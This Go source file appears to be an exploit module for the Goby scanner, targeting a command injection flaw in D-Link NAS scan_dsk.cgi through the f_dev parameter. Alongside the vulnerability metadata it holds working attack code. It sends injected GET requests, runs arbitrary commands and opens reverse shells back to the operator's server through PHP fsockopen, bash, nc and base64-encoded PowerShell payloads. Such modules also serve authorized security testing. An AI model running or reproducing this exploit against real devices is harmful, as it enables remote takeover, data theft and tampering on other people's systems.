package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "D-Link NAS /cgi-bin/scan_dsk.cgi Command Execution Vulnerability",
    "Description": "<p>D-Link is a web-based storage solution that provides large storage space and accesses and manages data over a network connection. It is suitable for enterprises and can be used as an enterprise cloud disk to provide convenient and fast storage and sharing services for enterprise employees. This vulnerability is a command injection vulnerability in the \"scan_dsk.cgi\" script that allows a remote attacker to execute arbitrary commands via a specially crafted HTTP GET request. The vulnerability also specifically affects the f_dev parameter in the ScanDisk_run_e2fsck command of the scan_dsk.cgi script. Malicious commands injected with \"f_dev\" parameters can lead to unauthorized command execution due to inadequate input filtering.</p>",
    "Product": "D-Link NAS",
    "Homepage": "https://www.dlink.com/",
    "DisclosureDate": "2024-11-20",
    "PostTime": "2024-11-20",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "GobyQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands on D-Link NAS devices, potentially leading to complete control of the device, data leakage, or tampering.</p>",
    "Recommendation": "<p>1. Pay attention to the manufacturer's official website and update the information in time: <a href=\"http://www.dlink.com.cn\">www.dlink.com.cn</a>  </p><p> 2. Network access to the management interface should be limited to trusted IP addresses.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/143885185"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Reverse",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "hostname",
            "show": "Mode=Command"
        },
        {
            "name": "Reverse",
            "type": "select",
            "value": "ByPhp",
            "show": "Mode=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "D-Link NAS /cgi-bin/scan_dsk.cgi 命令执行漏洞",
            "Product": "D-Link NAS",
            "Description": "<p>‌D-Link 是一种基于网络的存储解决方案，提供大容量存储空间，并通过网络连接访问和管理数据。它适用于企业，可以作为企业云盘使用，为企业员工提供方便快捷的存储和共享服务‌。该漏洞是\"scan_dsk.cgi\"脚本中的命令注入漏洞，允许远程攻击者通过特制的 HTTP GET 请求执行任意命令。同时该漏洞特别影响\"scan_dsk.cgi 脚本的\"ScanDisk_run_e2fsck\"命令中的\"f_dev\"参数。由于输入过滤不充分，注入\"f_dev\"参数的恶意命令可能导致未经授权的命令执行。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.dlink.com.cn\">www.dlink.com.cn</a>&nbsp;</p><p>2、 管理接口的网络访问应仅限于受信任的 IP 地址。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "D-Link NAS /cgi-bin/scan_dsk.cgi Command Execution Vulnerability",
            "Product": "D-Link NAS",
            "Description": "<p>D-Link is a web-based storage solution that provides large storage space and accesses and manages data over a network connection. It is suitable for enterprises and can be used as an enterprise cloud disk to provide convenient and fast storage and sharing services for enterprise employees. This vulnerability is a command injection vulnerability in the \"scan_dsk.cgi\" script that allows a remote attacker to execute arbitrary commands via a specially crafted HTTP GET request. The vulnerability also specifically affects the f_dev parameter in the ScanDisk_run_e2fsck command of the scan_dsk.cgi script. Malicious commands injected with \"f_dev\" parameters can lead to unauthorized command execution due to inadequate input filtering.<br></p>",
            "Recommendation": "<p>1. Pay attention to the manufacturer's official website and update the information in time: <a href=\"http://www.dlink.com.cn\">www.dlink.com.cn</a>&nbsp;&nbsp;</p><p>&nbsp;2. Network access to the management interface should be limited to trusted IP addresses.<br></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary commands on D-Link NAS devices, potentially leading to complete control of the device, data leakage, or tampering.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho"
    },
    "EditType": "fast",
    "PocId": "9973"
}`

	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		vulPath := "/cgi-bin/scan_dsk.cgi"

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfig := httpclient.NewGetRequestConfig(url)
			getRequestConfig.VerifyTls = false      // 不验证TLS证书
			getRequestConfig.FollowRedirect = false // 不跟随重定向

			// 设置请求头
			for headName, headValue := range head {
				getRequestConfig.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		}

		getHeader := map[string]string{}

		urlGet := "/cgi-bin/scan_dsk.cgi?cmd=ScanDisk_run_e2fsck&f_dev=;" + url.QueryEscape(command) + ";"

		// 发包
		resp, err := setGetRequest(hostInfo, urlGet, getHeader)
		// 检查发包错误
		if err != nil {
			return "", "", err
		}

		if resp == nil || resp.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}

		regStr := `([^'"]+)Content-type: text/html`
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(resp.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		reResult := regObj.FindStringSubmatch(resp.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := reResult[1]

		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},

		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByPhp := func(rp string) string {
				return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"sh <&3 >&3 2>&3\");'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPhp":          ReverseTcpByPhp,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["Mode"])
			switch attackType {
			case "Command":
				//配置命令
				command := goutils.B2S(ss.Params["Command"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "Reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["Reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
